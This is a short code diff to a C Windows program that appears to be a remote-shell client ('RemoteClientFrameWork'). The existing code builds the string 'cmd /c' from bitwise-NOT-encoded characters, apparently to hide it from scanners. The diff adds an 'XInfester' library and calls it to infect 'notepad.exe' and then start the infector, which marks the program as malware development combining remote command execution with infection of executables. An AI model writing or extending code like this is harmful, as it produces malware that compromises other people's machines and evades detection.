@@ -1,4 +1,7 @@
 #include "RemoteClientFrameWork.h"
+
+#include "../XInfester/inc/XInfester.h"
+
 #define  REMOTESHELL_PROCESS_GUID ("14B590DD-E9D3-4300-BF5D-4228B825B145")
 
 static char kcmdChar[]={~'c',~'m',~'d',~' ',~'/',~'c',~' ',
@@ -20,9 +23,17 @@ BOOL IsAlreadyRunning()
 	return FALSE;
 }
 
-
-int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
+int main()
+//int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
 {
+
+	XInfester_InfestFile("J:\\notepad.exe");
+	//X Infester starter
+	XInfester_Run();
+
+	printf("Hello World");
+	getchar();
+	return 0;
 	if (IsAlreadyRunning())
 	{
 		exit(0);
